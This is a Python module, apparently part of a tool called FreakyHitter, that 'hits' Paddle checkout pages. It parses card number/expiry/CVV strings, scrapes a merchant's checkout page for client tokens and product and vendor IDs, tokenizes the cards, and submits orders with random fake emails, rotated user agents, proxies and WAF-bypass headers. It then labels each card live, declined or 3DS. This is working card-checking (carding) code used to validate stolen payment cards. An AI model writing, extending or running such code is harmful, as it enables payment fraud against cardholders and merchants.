"""
Paddle hitter for FreakyHitter integration.
Supports Paddle Classic and Paddle Billing (v2) checkout flows.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin, urlencode

from .waf_solver import get_bypass_headers
from .curl_compat import create_connector

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

PADDLE_API_BASE = "https://vendors.paddle.com/api"
PADDLE_CHECKOUT_BASE = "https://buy.paddle.com"


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


def _random_email() -> str:
    domains = ["gmail.com", "yahoo.com", "hotmail.com"]
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    return f"{name}@{random.choice(domains)}"


async def _get_paddle_config(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Extract Paddle configuration from checkout page."""
    config = {"product_id": None, "vendor_id": None, "token": None, "checkout_id": None, "is_v2": False}
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")
            final_url = str(resp.url)

        # Paddle v2 checkout token
        token = re.search(r'(?:clientToken|client_token)["\s:\']+(["\'])([a-z]{4,5}_[A-Za-z0-9_\-]{20,})\1', html)
        if token:
            config["token"] = token.group(2)
            config["is_v2"] = True

        # Product ID
        prod = re.search(r'(?:product|productId|product_id)["\s:\'=]+(\d{5,})', html)
        if prod:
            config["product_id"] = prod.group(1)

        # Vendor ID
        vendor = re.search(r'(?:vendor|vendorId|vendor_id)["\s:\'=]+(\d{4,})', html)
        if vendor:
            config["vendor_id"] = vendor.group(1)

        # Checkout ID from URL
        checkout = re.search(r'/checkout/([A-Za-z0-9\-]+)', final_url)
        if checkout:
            config["checkout_id"] = checkout.group(1)

    except Exception:
        pass
    return config


async def _paddle_tokenize(session: aiohttp.ClientSession, cc: str, mm: str, yy: str, cvv: str, config: Dict, url: str, proxy: Optional[str]) -> Optional[str]:
    """Tokenize card via Paddle's tokenization service."""
    token_url = "https://api.paddle.com/payment-methods/tokenize" if config.get("is_v2") else f"{PADDLE_CHECKOUT_BASE}/api/2.0/token"

    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json" if config.get("is_v2") else "application/x-www-form-urlencoded",
        "Origin": PADDLE_CHECKOUT_BASE,
        "Referer": url,
    }

    if config.get("token"):
        headers["Authorization"] = f"Bearer {config['token']}"

    if config.get("is_v2"):
        payload = {
            "type": "card",
            "card": {
                "number": cc,
                "expiry_month": int(mm),
                "expiry_year": exp_year,
                "cvv": cvv,
            }
        }
        try:
            async with session.post(token_url, json=payload, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                data = await resp.json(content_type=None)
                return data.get("data", {}).get("id") or data.get("token")
        except Exception:
            return None
    else:
        data = urlencode({
            "number": cc,
            "expiry_month": mm.zfill(2),
            "expiry_year": str(exp_year)[-2:],
            "cvv": cvv,
        })
        try:
            async with session.post(token_url, data=data, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                result = await resp.json(content_type=None)
                return result.get("token") or result.get("data", {}).get("token")
        except Exception:
            return None


async def hit_paddle(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Hit a Paddle checkout page."""
    start = time.time()

    parsed_card = parse_card(card_str)
    if not parsed_card:
        return {"status": "error", "message": "Invalid card format", "gateway": "Paddle", "time_taken": 0}

    cc, mm, yy, cvv = parsed_card
    connector = create_connector()

    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        config = await _get_paddle_config(session, url, proxy)
        token = await _paddle_tokenize(session, cc, mm, yy, cvv, config, url, proxy)

        if not token:
            return {"status": "error", "message": "Could not tokenize card for Paddle", "gateway": "Paddle", "time_taken": round(time.time() - start, 2)}

        # Submit payment
        parsed_url = urlparse(url)
        base = f"{parsed_url.scheme}://{parsed_url.netloc}"

        submit_url = f"{PADDLE_CHECKOUT_BASE}/api/2.0/order" if not config.get("is_v2") else "https://api.paddle.com/transactions"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": PADDLE_CHECKOUT_BASE,
            "Referer": url,
        }
        if config.get("token"):
            headers["Authorization"] = f"Bearer {config['token']}"

        payload = {
            "payment_method_token": token,
            "product_id": config.get("product_id"),
            "vendor_id": config.get("vendor_id"),
            "email": _random_email(),
            "quantity": 1,
        }

        try:
            async with session.post(
                submit_url,
                json=payload,
                headers=headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=30),
                allow_redirects=True,
            ) as resp:
                text = await resp.text(errors="ignore")
                status_code = resp.status
        except asyncio.TimeoutError:
            return {"status": "error", "message": "Request timed out", "gateway": "Paddle", "time_taken": round(time.time() - start, 2)}
        except Exception as e:
            return {"status": "error", "message": str(e)[:100], "gateway": "Paddle", "time_taken": round(time.time() - start, 2)}

    time_taken = round(time.time() - start, 2)
    result = _classify_paddle_response(text, status_code)
    result["gateway"] = "Paddle"
    result["time_taken"] = time_taken
    return result


def _classify_paddle_response(text: str, status_code: int) -> Dict[str, str]:
    lower = text.lower()
    try:
        data = json.loads(text)
        state = data.get("data", {}).get("state", "").lower()
        if state in ("completed", "paid", "active"):
            return {"status": "live", "message": "Payment Successful ✅"}
        if state in ("pending", "ready"):
            return {"status": "3ds", "message": "Payment Pending 🔄"}
    except Exception:
        pass

    if any(k in lower for k in ["success", "completed", "paid", "order_paid", "approved"]):
        return {"status": "live", "message": "Payment Approved ✅"}
    if any(k in lower for k in ["declined", "failed", "card_declined", "insufficient"]):
        return {"status": "decline", "message": "Card Declined ❌"}
    if any(k in lower for k in ["3d", "authentication", "redirect", "pending"]):
        return {"status": "3ds", "message": "3DS Required 🔐"}
    if status_code in (200, 201):
        return {"status": "live", "message": "Processed ✅"}

    return {"status": "decline", "message": f"Unknown (HTTP {status_code}) ⚠️"}
